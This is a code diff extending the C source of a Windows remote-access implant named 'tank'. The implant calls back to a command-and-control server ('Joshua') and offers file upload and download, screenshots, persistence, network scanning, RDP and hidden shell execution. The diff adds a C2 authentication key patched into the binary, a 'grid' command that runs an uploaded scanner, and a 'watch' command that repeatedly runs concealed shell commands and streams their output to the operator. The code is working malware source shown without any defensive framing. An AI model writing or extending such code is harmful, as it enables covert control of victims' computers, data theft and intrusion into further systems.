@@ -19,6 +19,8 @@
  *   get <path>         FILE:<size>\n <raw bytes> <<<DONE>>>\n
  *   put <path>         PUTREADY\n  wait PUTSIZE:<n>\n  <n bytes>  <<<DONE>>>\n
  *   screenshot         FILE:<size>\n <bmp bytes> <<<DONE>>>\n
+ *   watch <ms> <cmd>   output <<<WATCH_TICK>>>\n [sleep] output <<<WATCH_TICK>>>\n ...
+ *                      any inbound data stops the loop and sends <<<DONE>>>\n
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -47,6 +49,9 @@
 #ifndef TANK_C2_PORT
 #  define TANK_C2_PORT  4444
 #endif
+#ifndef TANK_C2_KEY
+#  define TANK_C2_KEY   00000000    /* must match Joshua server key; patch with CLU */
+#endif
 #ifndef TANK_RETRY_MS
 #  define TANK_RETRY_MS 30000
 #endif
@@ -57,6 +62,7 @@
  *   offset 14: host  (64 bytes, null-padded)
  *   offset 78: port  (2 bytes, little-endian WORD)
  *   offset 80: tls   (1 byte,  0 = plain, 1 = TLS)
+ *   offset 81: key   (9 bytes, 8 hex chars + NUL — must match Joshua server key)
  * ----------------------------------------------------------------------- */
 #pragma pack(1)
 static struct {
@@ -64,11 +70,13 @@ static struct {
     char  host[64];
     WORD  port;
     BYTE  tls;
+    char  key[9];
 } g_clu = {
     "AELDRECLU0001",
     TANK_STR(TANK_C2_HOST),  /* char[64]: C zero-fills remainder */
     TANK_C2_PORT,
-    0
+    0,
+    TANK_STR(TANK_C2_KEY)
 };
 #pragma pack()
 
@@ -80,6 +88,8 @@ static struct {
 #define TLS_BUFSZ   (32*1024)
 #define DONE_STR    "<<<DONE>>>\n"
 #define DONE_LEN    11
+#define TICK_STR    "<<<WATCH_TICK>>>\n"
+#define TICK_LEN    17
 
 #ifndef CREATE_NO_WINDOW
 #  define CREATE_NO_WINDOW 0x08000000UL
@@ -1349,6 +1359,9 @@ static int cmd_screenshot(SOCKET s)
     h = GetSystemMetrics(SM_CYSCREEN);
 
     hdcScr = GetDC(NULL);
+    if (!hdcScr) {
+        send_str(s, "screenshot: GetDC failed\r\n"); return send_done(s);
+    }
     hdcMem = CreateCompatibleDC(hdcScr);
     hBmp   = CreateCompatibleBitmap(hdcScr, w, h);
     if (!hdcMem || !hBmp) {
@@ -2506,6 +2519,42 @@ static void sc_tick(void)
     }
 }
 
+/* -----------------------------------------------------------------------
+ * cmd_grid: run grid32.exe / gridnt.exe from the same directory as tank.exe,
+ * pass the operator's args, capture stdout and stream it back to Joshua.
+ * Upload grid32.exe (or gridnt.exe) next to tank.exe first via 'put'.
+ * ----------------------------------------------------------------------- */
+static int cmd_grid(SOCKET s, const char *args, const char *shell)
+{
+    char tank_dir[MAX_PATH];
+    char grid_path[MAX_PATH];
+    char cmdline[MAX_PATH + 600];
+    char *sl;
+
+    if (!args || !args[0]) {
+        send_str(s, "grid: usage: grid <target> -p <ports> [-t ms] [-b] [-T n]\r\n"
+                    "grid: (requires grid32.exe or gridnt.exe next to tank.exe)\r\n");
+        return send_done(s);
+    }
+
+    GetModuleFileName(NULL, tank_dir, MAX_PATH);
+    sl = strrchr(tank_dir, '\\');
+    if (sl) { sl[1] = '\0'; } else { lstrcat(tank_dir, "\\"); }
+
+    wsprintf(grid_path, "%sgrid32.exe", tank_dir);
+    if (GetFileAttributes(grid_path) == INVALID_FILE_ATTRIBUTES) {
+        wsprintf(grid_path, "%sgridnt.exe", tank_dir);
+        if (GetFileAttributes(grid_path) == INVALID_FILE_ATTRIBUTES) {
+            send_str(s, "grid: grid32.exe / gridnt.exe not found next to tank.exe\r\n"
+                        "grid: put grid32.exe to the tank directory first\r\n");
+            return send_done(s);
+        }
+    }
+
+    wsprintf(cmdline, "\"%s\" %s -q", grid_path, args);
+    return exec_command(s, cmdline, shell);
+}
+
 static int cmd_scan(SOCKET s, const char *args)
 {
     /* scan <target> [-p ports] [-t ms] [-T pool] [-b]                */
@@ -2890,6 +2939,112 @@ static int cmd_rdp(SOCKET s, const char *args)
 }
 
 /* -----------------------------------------------------------------------
+ * cmd_watch — repeat a shell command every N ms; any inbound data stops it
+ * ----------------------------------------------------------------------- */
+static int cmd_watch(SOCKET s, const char *arg, const char *shell)
+{
+    long        interval_ms;
+    const char *p;
+    char        cmdbuf[CMD_BUFSZ];
+
+    if (!arg || !*arg) {
+        send_str(s, "watch: usage: watch <ms> <cmd>\r\n");
+        return send_done(s);
+    }
+    interval_ms = atol(arg);
+    if (interval_ms < 500) interval_ms = 500;
+
+    p = arg;
+    while (*p && *p != ' ') p++;
+    while (*p == ' ') p++;
+    if (!*p) {
+        send_str(s, "watch: usage: watch <ms> <cmd>\r\n");
+        return send_done(s);
+    }
+    lstrcpyn(cmdbuf, p, CMD_BUFSZ);
+
+    { char hdr[CMD_BUFSZ + 64];
+      wsprintf(hdr, "[watching: %s  interval %ldms -- send any input to stop]\r\n",
+               cmdbuf, interval_ms);
+      if (send_str(s, hdr) < 0) return -1; }
+
+    for (;;) {
+        /* One iteration: spawn shell command, stream output */
+        {
+            SECURITY_ATTRIBUTES sa;
+            STARTUPINFO         si;
+            PROCESS_INFORMATION pi;
+            HANDLE  hRead = INVALID_HANDLE_VALUE, hWrite = INVALID_HANDLE_VALUE;
+            char    cmdline[CMD_BUFSZ + MAX_PATH + 8];
+            char   *outbuf;
+            DWORD   nread;
+            int     io_err = 0;
+
+            outbuf = (char *)GlobalAlloc(GMEM_FIXED, OUT_BUFSZ);
+            if (!outbuf) {
+                if (send_str(s, "watch: oom\r\n") < 0) return -1;
+            } else {
+                memset(&sa, 0, sizeof(sa));
+                sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
+                if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
+                    wsprintf(outbuf, "watch: pipe failed (%lu)\r\n", GetLastError());
+                    if (send_str(s, outbuf) < 0) io_err = 1;
+                } else {
+                    wsprintf(cmdline, "%s /c %s", shell, cmdbuf);
+                    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
+                    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+                    si.wShowWindow = SW_HIDE;
+                    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
+                    si.hStdOutput = hWrite;
+                    si.hStdError  = hWrite;
+                    memset(&pi, 0, sizeof(pi));
+                    if (!CreateProcess(NULL, cmdline, NULL, NULL, TRUE,
+                                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                        wsprintf(outbuf, "watch: exec failed (%lu)\r\n", GetLastError());
+                        if (send_str(s, outbuf) < 0) io_err = 1;
+                        CloseHandle(hRead); CloseHandle(hWrite);
+                    } else {
+                        CloseHandle(hWrite); hWrite = INVALID_HANDLE_VALUE;
+                        CloseHandle(pi.hThread);
+                        while (ReadFile(hRead, outbuf, OUT_BUFSZ, &nread, NULL) && nread > 0) {
+                            if (send_all(s, outbuf, (int)nread) < 0) { io_err = 1; break; }
+                        }
+                        WaitForSingleObject(pi.hProcess, 30000UL);
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(hRead);
+                    }
+                }
+                GlobalFree(outbuf);
+            }
+            if (io_err) return -1;
+        }
+
+        if (send_all(s, TICK_STR, TICK_LEN) < 0) return -1;
+
+        /* Interruptible sleep: any inbound data = stop signal */
+        {
+            long rem = interval_ms;
+            while (rem > 0) {
+                fd_set rset; struct timeval tv; int sel;
+                long slice = (rem > 100) ? 100 : rem;
+                FD_ZERO(&rset); FD_SET(s, &rset);
+                tv.tv_sec  = 0;
+                tv.tv_usec = slice * 1000L;
+                sel = select(0, &rset, NULL, NULL, &tv);
+                if (sel > 0) {
+                    /* Drain the stop signal so run_session doesn't exec it */
+                    char drain[256];
+                    recv(s, drain, sizeof(drain), 0);
+                    return send_done(s);
+                }
+                if (sel < 0)  return -1;
+                rem -= slice;
+            }
+        }
+    }
+}
+
+/* -----------------------------------------------------------------------
  * Session dispatcher
  * ----------------------------------------------------------------------- */
 static void run_session(SOCKET s)
@@ -2901,9 +3056,10 @@ static void run_session(SOCKET s)
     find_shell(shell,MAX_PATH);
     compname[0]='\0'; GetComputerName(compname,&namesz);
     memset(&osv,0,sizeof(osv)); osv.dwOSVersionInfoSize=sizeof(osv); GetVersionEx(&osv);
-    wsprintf(banner,"Tank/1 host=%s os=%lu.%lu.%lu shell=%s\n",
+    wsprintf(banner,"Tank/1 host=%s os=%lu.%lu.%lu shell=%s key=%.8s\n",
              compname[0]?compname:"unknown",
-             osv.dwMajorVersion,osv.dwMinorVersion,osv.dwBuildNumber,shell);
+             osv.dwMajorVersion,osv.dwMinorVersion,osv.dwBuildNumber,shell,
+             g_clu.key);
     send_str(s,banner);
 
     for(;;) {
@@ -2930,6 +3086,7 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"less"))       rc=cmd_less(s,cmd_arg(cmd,"less"));
         else if(cmd_is(cmd,"persist"))    rc=cmd_persist(s,cmd_arg(cmd,"persist"));
         else if(cmd_is(cmd,"scan"))       rc=cmd_scan(s,cmd_arg(cmd,"scan"));
+        else if(cmd_is(cmd,"grid"))       rc=cmd_grid(s,cmd_arg(cmd,"grid"),shell);
         else if(cmd_is(cmd,"del"))        rc=cmd_del(s,cmd_arg(cmd,"del"));
         else if(cmd_is(cmd,"ren"))        rc=cmd_ren(s,cmd_arg(cmd,"ren"));
         else if(cmd_is(cmd,"mkdir"))      rc=cmd_mkdir(s,cmd_arg(cmd,"mkdir"));
@@ -2949,6 +3106,7 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"netstat"))    rc=cmd_netstat(s);
         else if(cmd_is(cmd,"route"))      rc=cmd_route(s);
         else if(cmd_is(cmd,"shell"))      rc=cmd_shell(s,shell);
+        else if(cmd_is(cmd,"watch"))      rc=cmd_watch(s,cmd_arg(cmd,"watch"),shell);
         else                              rc=exec_command(s,cmd,shell);
         if(rc<0) return;
     }
